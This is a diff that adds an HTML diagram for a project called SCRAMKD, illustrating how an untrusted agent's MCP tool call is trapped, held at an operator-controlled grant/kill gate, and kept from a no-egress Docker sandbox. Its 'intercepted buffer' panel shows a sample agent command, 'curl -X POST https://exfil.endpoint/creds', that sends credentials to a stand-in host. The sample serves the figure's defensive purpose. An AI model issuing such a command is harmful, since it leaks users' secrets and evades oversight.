@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=1000, height=500">
+  <title>SCRAMKD // FIG 2.1 Architectural Containment & Interlock Pipeline</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Geist+Mono:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #04060A;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      color: #E2E8F0;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      -webkit-font-smoothing: antialiased;
+    }
+    .font-mono {
+      font-family: 'Geist Mono', monospace;
+    }
+    /* 20px precision linear-gradient grid-matrix */
+    .grid-matrix {
+      background-size: 20px 20px;
+      background-image: 
+        linear-gradient(to right, rgba(255, 255, 255, 0.03) 1px, transparent 1px),
+        linear-gradient(to bottom, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
+    }
+    /* 45-degree hazard stripes */
+    .hazard-stripe {
+      background: repeating-linear-gradient(
+        -45deg,
+        #EF4444,
+        #EF4444 8px,
+        #000000 8px,
+        #000000 16px
+      );
+    }
+  </style>
+</head>
+<body class="bg-[#04060A]">
+  <!-- 1000x500 High-Assurance Engineering Workflow Schematic Frame -->
+  <div class="relative w-[1000px] h-[500px] bg-[#04060A] grid-matrix border border-white/10 flex flex-col justify-between overflow-hidden shadow-2xl select-none">
+    
+    <!-- TOP REGISTRATION & HEADER BAR (32px height) -->
+    <header class="h-[32px] w-full bg-[#090D15] border-b border-white/10 px-4 flex items-center justify-between z-20">
+      <div class="flex items-center gap-3">
+        <span class="w-1.5 h-1.5 bg-[#EF4444] rounded-none"></span>
+        <span class="font-mono text-[10px] tracking-wider text-slate-400 uppercase font-semibold">
+          FIG 2.1 // DETERMINISTIC POSIX KERNEL MEDIATION & LEASE ARBITRATION
+        </span>
+      </div>
+      <div class="flex items-center gap-4 font-mono text-[9px] text-slate-500 tracking-wider">
+        <span>SECURITY CLASS: <span class="text-slate-300">MIL-STD-1472H</span></span>
+        <span class="text-white/20">|</span>
+        <span>LATENCY: <span class="text-[#10B981] font-bold">&lt; 384 µs</span></span>
+        <span class="text-white/20">|</span>
+        <span>AUDIT POSTURE: <span class="text-[#F59E0B] font-bold">ARMED</span></span>
+      </div>
+    </header>
+
+    <!-- MAIN ISOLATION STAGE PIPELINE (3 HORIZONTAL CHAMBERS) -->
+    <main class="relative flex-1 w-full px-6 py-4 flex items-center justify-between z-10">
+
+      <!-- VECTOR BUS CONNECTORS LAYER (Absolute SVG Overlay) -->
+      <svg class="absolute inset-0 w-full h-full pointer-events-none z-0" xmlns="http://www.w3.org/2000/svg">
+        <defs>
+          <pattern id="dot-pat" x="0" y="0" width="10" height="10" patternUnits="userSpaceOnUse">
+            <circle cx="2" cy="2" r="0.75" fill="rgba(255,255,255,0.06)" />
+          </pattern>
+        </defs>
+
+        <!-- Bus 1: Chamber 01 to Chamber 02 -->
+        <!-- Exits Chamber 1 at right: x=304, y=250 -> enters Chamber 2 at left: x=330, y=250 -->
+        <g>
+          <line x1="304" y1="240" x2="330" y2="240" stroke="#EF4444" stroke-width="1.5" stroke-dasharray="3 2" />
+          <!-- Animated pulse indicator -->
+          <circle cx="317" cy="240" r="3" fill="#EF4444" />
+          <!-- Flow arrowhead entering red terminal -->
+          <polygon points="328,237 333,240 328,243" fill="#EF4444" />
+          <rect x="306" y="218" width="22" height="12" fill="#090D15" stroke="#EF4444" stroke-width="0.5" />
+          <text x="317" y="227" font-family="'Geist Mono', monospace" font-size="7" fill="#EF4444" text-anchor="middle" font-weight="700">STDIO</text>
+        </g>
+
+        <!-- Bus 2: Chamber 02 to Chamber 03 -->
+        <!-- Exits Chamber 2 at right: x=670, y=240 -> enters Chamber 3 at left: x=716, y=240 -->
+        <g>
+          <!-- Severed line: Gap of 16px to visually represent hardware interlock cut -->
+          <line x1="670" y1="240" x2="686" y2="240" stroke="#F59E0B" stroke-width="1.5" />
+          <!-- Dielectric Gap indicator -->
+          <line x1="686" y1="234" x2="686" y2="246" stroke="#EF4444" stroke-width="1.5" />
+          <line x1="702" y1="234" x2="702" y2="246" stroke="#64748B" stroke-width="1.5" />
+          <line x1="687" y1="240" x2="701" y2="240" stroke="#EF4444" stroke-width="1" stroke-dasharray="2 2" opacity="0.4" />
+          <!-- Resumed cold trace towards detonation chamber -->
+          <line x1="702" y1="240" x2="716" y2="240" stroke="#64748B" stroke-width="1.5" stroke-dasharray="2 2" />
+          <polygon points="713,237 718,240 713,243" fill="#64748B" />
+          <!-- Interlock severed badge -->
+          <rect x="684" y="218" width="20" height="12" fill="#070A10" stroke="#EF4444" stroke-width="0.5" />
+          <text x="694" y="227" font-family="'Geist Mono', monospace" font-size="7" fill="#EF4444" text-anchor="middle" font-weight="700">NO FD</text>
+        </g>
+      </svg>
+
+      <!-- ========================================== -->
+      <!-- CHAMBER 01: UNTRUSTED AGENT DISPATCH (280px) -->
+      <!-- ========================================== -->
+      <div class="relative w-[280px] h-[395px] bg-[#070A10] border border-[#EF4444]/40 flex flex-col justify-between p-3.5 z-10">
+        <!-- Corner Machined Registration Badges -->
+        <div class="absolute -top-[1px] -left-[1px] w-2 h-2 border-t border-l border-[#EF4444]"></div>
+        <div class="absolute -top-[1px] -right-[1px] w-2 h-2 border-t border-r border-[#EF4444]"></div>
+        <div class="absolute -bottom-[1px] -left-[1px] w-2 h-2 border-b border-l border-[#EF4444]"></div>
+        <div class="absolute -bottom-[1px] -right-[1px] w-2 h-2 border-b border-r border-[#EF4444]"></div>
+
+        <!-- Chamber Header -->
+        <div>
+          <div class="flex items-center justify-between border-b border-[#EF4444]/20 pb-2">
+            <span class="font-mono text-[11px] font-bold text-[#EF4444] tracking-wider uppercase flex items-center gap-1.5">
+              <span class="inline-block w-1.5 h-1.5 bg-[#EF4444]"></span>
+              [01] UNTRUSTED MCP CALL
+            </span>
+            <span class="font-mono text-[9px] text-[#EF4444]/80 tracking-widest px-1.5 py-0.5 border border-[#EF4444]/30 bg-[#EF4444]/10">
+              TRAPPED
+            </span>
+          </div>
+
+          <div class="mt-2.5 flex items-center justify-between font-mono text-[9px] text-slate-400">
+            <span>PORT: 65432 (STDIO)</span>
+            <span>SIG: POSIX_TRAP</span>
+          </div>
+        </div>
+
+        <!-- Inset Terminal Card: Payload -->
+        <div class="my-auto flex flex-col gap-2">
+          <div class="flex items-center justify-between font-mono text-[9px] text-slate-500 uppercase tracking-wider">
+            <span>INTERCEPTED BUFFER</span>
+            <span class="text-[#EF4444]">DIRTY INGRESS</span>
+          </div>
+          
+          <div class="bg-[#04060A] border border-white/10 p-2.5 rounded-none font-mono text-[11px] leading-relaxed text-slate-300 overflow-hidden shadow-inner">
+            <div class="text-[9px] text-slate-600 select-none pb-1 border-b border-white/5 mb-1.5 flex justify-between">
+              <span>RAW JSON-RPC DISPATCH</span>
+              <span>218 B</span>
+            </div>
+            <p class="text-[#EF4444] font-semibold break-all leading-snug">
+              --&gt; {<br>
+              &nbsp;&nbsp;<span class="text-slate-400">"method":</span> <span class="text-amber-300">"screenenv.bash_execute"</span>,<br>
+              &nbsp;&nbsp;<span class="text-slate-400">"params":</span> {<br>
+              &nbsp;&nbsp;&nbsp;&nbsp;<span class="text-slate-400">"cmd":</span> <span class="text-[#EF4444] bg-[#EF4444]/10 px-0.5">"curl -X POST https://exfil.endpoint/creds"</span><br>
+              &nbsp;&nbsp;}<br>
+              }
+            </p>
+          </div>
+
+          <div class="font-mono text-[9.5px] text-slate-400 leading-tight space-y-1 pt-1">
+            <div class="flex justify-between">
+              <span class="text-slate-500">ORIGIN:</span>
+              <span class="text-slate-300">Autonomous Agent Runtime</span>
+            </div>
+            <div class="flex justify-between">
+              <span class="text-slate-500">DESCRIPTOR:</span>
+              <span class="text-[#EF4444]">UNPRIVILEGED_FD</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Footer Indicator Pill -->
+        <div class="pt-2 border-t border-[#EF4444]/20 flex flex-col gap-1.5">
+          <div class="w-full py-1.5 px-2 bg-[#EF4444]/15 border border-[#EF4444] text-center font-mono text-[9px] font-bold text-[#EF4444] uppercase tracking-wider">
+            [ HIGH-RISK HOOK TRAPPED ]
+          </div>
+          <div class="flex justify-between items-center font-mono text-[8px] text-slate-500 tracking-wider">
+            <span>POSIX SIGILL ARMED</span>
+            <span>ZERO HOST PASS</span>
+          </div>
+        </div>
+      </div>
+
+
+      <!-- ========================================== -->
+      <!-- CHAMBER 02: SCRAMKD HARDWARE GATE (340px) -->
+      <!-- ========================================== -->
+      <div class="relative w-[340px] h-[415px] bg-[#090D15] border-2 border-[#F59E0B] p-3.5 flex flex-col justify-between shadow-[0_0_25px_rgba(245,158,11,0.08)] z-20">
+        <!-- Machined Structural Corner Tabs -->
+        <div class="absolute -top-[3px] -left-[3px] w-2.5 h-2.5 bg-[#F59E0B]"></div>
+        <div class="absolute -top-[3px] -right-[3px] w-2.5 h-2.5 bg-[#F59E0B]"></div>
+        <div class="absolute -bottom-[3px] -left-[3px] w-2.5 h-2.5 bg-[#F59E0B]"></div>
+        <div class="absolute -bottom-[3px] -right-[3px] w-2.5 h-2.5 bg-[#F59E0B]"></div>
+
+        <!-- Header Block -->
+        <div>
+          <div class="flex items-center justify-between border-b border-[#F59E0B]/30 pb-2">
+            <span class="font-mono text-[11px] font-bold text-white tracking-wider uppercase flex items-center gap-1.5">
+              <span class="inline-block w-2 h-2 bg-[#F59E0B] animate-pulse"></span>
+              [02] HARDWARE INTERLOCK GATE ACTOR
+            </span>
+            <span class="font-mono text-[8px] text-[#F59E0B] px-1 py-0.5 border border-[#F59E0B]/40 bg-[#F59E0B]/10 font-bold">
+              SWIFT 6
+            </span>
+          </div>
+          
+          <div class="mt-2 flex items-center justify-between font-mono text-[9px]">
+            <span class="text-slate-400">MUTEX: <span class="text-slate-200">OSAllocatedUnfairLock // Zero Data Races</span></span>
+          </div>
+        </div>
+
+        <!-- Center Mechanism Schema & Air Gap Vector -->
+        <div class="my-auto bg-[#05070A] border border-white/10 p-2.5 flex flex-col justify-between">
+          <div class="flex items-center justify-between font-mono text-[9px] pb-1.5 border-b border-white/5">
+            <span class="text-slate-400">CONTINUATION STATUS:</span>
+            <span class="text-[#F59E0B] font-bold tracking-wide">[ WAITER POOL SUSPENDED (1/1) ]</span>
+          </div>
+
+          <!-- Physical Knife Switch Vector Graphic -->
+          <div class="relative w-full h-[95px] flex items-center justify-center my-1 bg-[#070A10]/60 border border-white/5 overflow-hidden">
+            <svg class="w-full h-full" viewBox="0 0 300 90" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <!-- Background circuit traces -->
+              <line x1="20" y1="52" x2="90" y2="52" stroke="#64748B" stroke-width="2" />
+              <line x1="210" y1="52" x2="280" y2="52" stroke="#64748B" stroke-width="2" />
+
+              <!-- Ground and bus contacts -->
+              <rect x="88" y="46" width="12" height="12" fill="#090D15" stroke="#F59E0B" stroke-width="1.5" />
+              <circle cx="94" cy="52" r="3" fill="#F59E0B" />
+
+              <rect x="200" y="46" width="12" height="12" fill="#090D15" stroke="#64748B" stroke-width="1.5" />
+              <circle cx="206" cy="52" r="3" fill="#64748B" />
+
+              <!-- 45-Degree Deflected Sever Blade (Open Knife Switch) -->
+              <!-- Hinge is at (94, 52), blade angles up to (175, 20) -->
+              <line x1="94" y1="52" x2="182" y2="18" stroke="#EF4444" stroke-width="3" stroke-linecap="round" />
+              
+              <!-- Blade Trip Terminal Node -->
+              <circle cx="182" cy="18" r="4.5" fill="#EF4444" stroke="#FFFFFF" stroke-width="1" />
+              <circle cx="94" cy="52" r="2" fill="#FFFFFF" />
+
+              <!-- 16px Physical Trench / Air Gap Bracket -->
+              <line x1="106" y1="52" x2="194" y2="52" stroke="#EF4444" stroke-dasharray="2 2" stroke-width="1" opacity="0.4" />
+              <line x1="106" y1="46" x2="106" y2="58" stroke="#EF4444" stroke-width="1" opacity="0.6" />
+              <line x1="194" y1="46" x2="194" y2="58" stroke="#EF4444" stroke-width="1" opacity="0.6" />
+              
+              <text x="150" y="66" font-family="'Geist Mono', monospace" font-size="8" fill="#EF4444" text-anchor="middle" font-weight="700">
+                16mm DIELECTRIC AIR-GAP [OPEN]
+              </text>
+              <text x="150" y="77" font-family="'Geist Mono', monospace" font-size="7" fill="#64748B" text-anchor="middle">
+                Continuation.withCheckedContinuation()
+              </text>
+
+              <!-- Dielectric arc warning spark -->
+              <path d="M 172 26 L 180 32 L 175 36 L 184 44" stroke="#F59E0B" stroke-width="1" stroke-linecap="round" opacity="0.8" />
+            </svg>
+          </div>
+
+          <div class="flex items-center justify-between font-mono text-[8.5px] text-slate-400 pt-1">
+            <span>CONCURRENCY: <span class="text-[#10B981]">ACTOR-ISOLATED</span></span>
+            <span>LEASE DISPATCH: <span class="text-[#EF4444]">SUSPENDED</span></span>
+          </div>
+        </div>
+
+        <!-- Dual Physical Keycap Operator Controls -->
+        <div>
+          <div class="font-mono text-[8px] uppercase tracking-wider text-slate-500 mb-1.5 flex justify-between">
+            <span>OPERATOR PHYSICAL INTERVENTION</span>
+            <span>NON-BYPASSABLE</span>
+          </div>
+
+          <div class="grid grid-cols-2 gap-2">
+            <!-- Button Left: GRANT PERMISSIVE (SPACE) -->
+            <div class="bg-black border border-[#10B981] p-2 flex flex-col items-center justify-center text-center cursor-default hover:bg-[#10B981]/10 transition-colors">
+              <span class="font-mono text-[10px] font-bold text-[#10B981] tracking-tight">
+                [ GRANT PERMISSIVE ]
+              </span>
+              <span class="font-mono text-[8.5px] text-slate-400 mt-0.5">
+                KEY: &lt;SPACE&gt; (1x LEASE)
+              </span>
+            </div>
+
+            <!-- Button Right: EMERGENCY SCRAM (ESC) -->
+            <div class="hazard-stripe border border-[#EF4444] p-2 flex flex-col items-center justify-center text-center cursor-default">
+              <div class="bg-[#EF4444] text-black w-full py-0.5 font-mono text-[10px] font-black uppercase tracking-tight text-center">
+                EMERGENCY SCRAM
+              </div>
+              <span class="font-mono text-[8.5px] text-white font-bold mt-0.5 drop-shadow">
+                KEY: &lt;ESC&gt; (SIGKILL)
+              </span>
+            </div>
+          </div>
+        </div>
+
+      </div>
+
+
+      <!-- ========================================== -->
+      <!-- CHAMBER 03: ISOLATED RUNTIME DETONATION (260px) -->
+      <!-- ========================================== -->
+      <div class="relative w-[260px] h-[395px] bg-[#070A10] border border-[#64748B] p-3.5 flex flex-col justify-between z-10">
+        <!-- Corner Machined Registration Badges -->
+        <div class="absolute -top-[1px] -left-[1px] w-2 h-2 border-t border-l border-[#64748B]"></div>
+        <div class="absolute -top-[1px] -right-[1px] w-2 h-2 border-t border-r border-[#64748B]"></div>
+        <div class="absolute -bottom-[1px] -left-[1px] w-2 h-2 border-b border-l border-[#64748B]"></div>
+        <div class="absolute -bottom-[1px] -right-[1px] w-2 h-2 border-b border-r border-[#64748B]"></div>
+
+        <!-- Chamber Header -->
+        <div>
+          <div class="flex items-center justify-between border-b border-slate-700/60 pb-2">
+            <span class="font-mono text-[11px] font-bold text-slate-300 tracking-wider uppercase flex items-center gap-1.5">
+              <span class="inline-block w-1.5 h-1.5 bg-slate-400"></span>
+              [03] SCREENENV CONTAINER
+            </span>
+            <span class="font-mono text-[8px] text-slate-400 px-1 py-0.5 border border-slate-700 bg-slate-800">
+              DOCKER
+            </span>
+          </div>
+
+          <div class="mt-2 font-mono text-[10px] text-slate-400 truncate">
+            IMAGE: <span class="text-slate-200">amhma/ubuntu-desktop</span>
+          </div>
+          <div class="font-mono text-[9px] text-slate-500">
+            TAG: 22.04-0.1.0 // NO EGRESS
+          </div>
+        </div>
+
+        <!-- Middle Runtime Conduit Specs -->
+        <div class="my-auto bg-[#04060A] border border-white/5 p-2.5 flex flex-col gap-2 font-mono text-[9.5px]">
+          <div class="text-[8.5px] text-slate-500 uppercase border-b border-white/5 pb-1 flex justify-between">
+            <span>CONDUIT CHANNEL</span>
+            <span class="text-[#64748B]">ISOLATED</span>
+          </div>
+
+          <div>
+            <div class="text-slate-400">PIPE ARCHITECTURE:</div>
+            <div class="text-slate-200 text-[10px] font-semibold mt-0.5">
+              stdio Pipe [F_SETNOSIGPIPE]
+            </div>
+          </div>
+
+          <div>
+            <div class="text-slate-400">CHUNK PROTOCOL:</div>
+            <div class="text-slate-300">16 KiB Continuous Stream</div>
+          </div>
+
+          <div>
+            <div class="text-slate-400">SOCKET INGRESS:</div>
+            <div class="text-[#EF4444] font-semibold">0 ALLOCATED PORTS</div>
+          </div>
+
+          <div class="pt-1.5 border-t border-white/5 text-[8.5px] text-slate-500">
+            SANDBOX: MACH_VIRTUAL_MEMORY_HARDENED
+          </div>
+        </div>
+
+        <!-- Footer Chamber Status Indicator -->
+        <div class="pt-2 border-t border-slate-700/60 flex flex-col gap-1.5">
+          <div class="w-full py-1.5 px-2 bg-slate-800/40 border border-[#64748B] text-center font-mono text-[9.5px] font-bold text-slate-300 uppercase tracking-wider">
+            [ LEASE RESTRICTED: BLOCKED ]
+          </div>
+          <div class="flex justify-between items-center font-mono text-[8px] text-slate-500 tracking-wider">
+            <span>FD STATUS: SEVERED</span>
+            <span>DARWIN RING-0 INTERCEPT</span>
+          </div>
+        </div>
+
+      </div>
+
+    </main>
+
+    <!-- FOOTER TECHNICAL METRICS STRIP (28px height) -->
+    <footer class="h-[28px] w-full bg-[#070A10] border-t border-white/10 px-4 flex items-center justify-between font-mono text-[9px] text-slate-400 z-20">
+      <div class="flex items-center gap-4">
+        <span>ARCH: <span class="text-white">APPLE SILICON / XNU DARWIN</span></span>
+        <span class="text-white/20">•</span>
+        <span>GATE TYPE: <span class="text-white">DETERMINISTIC NON-PROBABILISTIC</span></span>
+        <span class="text-white/20">•</span>
+        <span>NO LLM IN LOOP</span>
+      </div>
+      <div class="flex items-center gap-3">
+        <span class="w-1.5 h-1.5 bg-[#10B981]"></span>
+        <span class="text-slate-300">REPO: github.com/spetro511/scramkd</span>
+      </div>
+    </footer>
+
+  </div>
+</body>
+</html>
